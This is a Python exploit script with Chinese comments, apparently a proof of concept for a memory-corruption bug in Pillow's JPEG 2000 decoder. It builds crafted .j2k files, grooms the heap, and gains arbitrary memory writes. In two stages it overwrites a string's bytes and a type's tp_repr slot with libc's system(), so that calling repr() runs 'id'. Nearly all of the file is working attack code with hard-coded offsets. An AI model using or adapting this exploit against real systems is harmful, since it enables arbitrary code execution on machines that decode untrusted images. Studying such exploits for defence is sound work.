#!/usr/bin/env python3
# 最终 RCE（两次嫁接）：
#   decode#1: buf = 目标 str 地址  -> 写 "id\0" 进它首字节
#   decode#2: buf = tp_repr       -> 写 system
#   repr(str) => system("id")
import ctypes, struct, gc, subprocess
from PIL import Image


def R(a):
    return ctypes.c_uint64.from_address(a).value


libc = ctypes.CDLL('libc.so.6')
SYSTEM = ctypes.cast(libc.system, ctypes.c_void_p).value
print("system = %#x" % SYSTEM, flush=True)

probe = memoryview(bytearray(16))
F = R(id(probe) + 0x60)
sh = R(id(probe) + 0x68)
st = R(id(probe) + 0x70)

L = 0x260
c = bytearray(L)


def put(off, val):
    o = off - 0x20
    if o >= 0 and o + 8 <= L:
        c[o:o + 8] = struct.pack('<Q', val & 0xFFFFFFFFFFFFFFFF)


for off, val in [(0x38, 0xa40000), (0x40, 0), (0x48, 16), (0x50, 1), (0x58, 0x100000000),
                 (0x60, F), (0x68, sh), (0x70, st), (0x78, 0), (0x80, 0)]:
    put(off, val)

hold = [bytes(519) for _ in range(2000)] + [bytes(608) for _ in range(2000)]


def build(out, C):
    r = subprocess.run(['python3', '/tmp/exp/builder.py', '/tmp/exp/base.j2k', out, '0', '23',
                        hex(0xa350c8), hex(0xa3c800), hex(C), '-370'],
                       capture_output=True, text=True)
    if 'OK' not in r.stdout:
        print("build 失败", r.stdout, r.stderr, flush=True)
        raise SystemExit(1)


def groom_and_decode(path, tries=4):
    for _ in range(tries):
        pairs = []
        for _ in range(400):
            D = bytes(519)
            v = bytes(c)
            pairs.append((D, v))
        keep = [D for D, v in pairs if id(v) - id(D) != 0x230]
        vs = [v for D, v in pairs]
        del pairs
        gc.collect()
        try:
            im = Image.open(path); im.load()
        except Exception as e:
            print("decode err", repr(e), flush=True)
        hits = [v for v in vs if R(id(v) + 8) == 0xa350c8]
        print("  命中 =", len(hits), flush=True)
        if hits:
            return hits[0]
    return None


# ---- 目标 str（大对象、glibc 堆）----
tgt = 'A' * 600
TADDR = id(tgt)
print("目标 str id=%#x" % TADDR, flush=True)

# ---- decode#1: 写 "id\0" 进 str ----
build('/tmp/exp/stage1.j2k', TADDR)
mv1 = groom_and_decode('/tmp/exp/stage1.j2k')
if not mv1:
    raise SystemExit("decode#1 没命中")
print("mv1 buf=%#x len=%#x" % (R(id(mv1) + 0x38), R(id(mv1) + 0x48)), flush=True)
mv1[0]=ord('h'); mv1[1]=ord('d'); mv1[2]=0  # 'h'+1(refcnt)= 'i'
print("str 首字节 = %r" % ctypes.string_at(TADDR, 8), flush=True)

# ---- decode#2: 把 system 写进 tp_repr ----
build('/tmp/exp/stage2.j2k', 0xa3c908)
mv2 = groom_and_decode('/tmp/exp/stage2.j2k')
if not mv2:
    raise SystemExit("decode#2 没命中")
for i in range(8):
    mv2[i] = (SYSTEM >> (8 * i)) & 0xFF
print("tp_repr 槽 = %#x (期望 %#x)" % (R(0xa3c908), SYSTEM), flush=True)

# ---- 触发 ----
print("=== RCE_TRIGGER_BEGIN ===", flush=True)
try:
    print("repr:", repr(tgt), flush=True)
except Exception as e:
    print("repr 异常:", repr(e), flush=True)
print("=== RCE_TRIGGER_END ===", flush=True)